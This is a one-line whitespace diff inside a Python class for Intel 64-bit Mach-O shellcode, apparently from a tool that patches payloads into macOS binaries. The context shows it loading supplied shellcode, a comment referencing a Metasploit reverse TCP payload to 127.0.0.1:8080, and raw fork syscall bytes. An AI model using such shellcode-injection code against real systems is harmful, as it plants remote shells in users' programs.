@@ -198,6 +198,7 @@ class macho_intel64_shellcode():
             supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
 
         #From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
+        
         self.shellcode2 = supplied_shellcode
 
         self.shellcode1 = ("\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2")  # FORK()
